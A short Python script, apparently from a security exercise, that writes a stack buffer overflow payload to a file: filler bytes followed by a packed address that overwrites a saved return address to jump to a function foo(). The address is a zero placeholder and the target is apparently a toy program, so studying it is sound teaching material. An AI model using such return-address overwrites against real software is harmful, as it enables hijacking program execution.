import struct
import sys

buffer_size = 4
if (len(sys.argv) >= 2):
    buffer_size = int(sys.argv[1])
foo_address = 0x00000000

# Fill the buffer with junk data
payload = b'A' * (buffer_size + 12)

# Overwrite the return address with the address of foo()
payload += struct.pack('<I', foo_address)

# Write the payload to a file
with open('payload', 'wb') as f:
    f.write(payload)
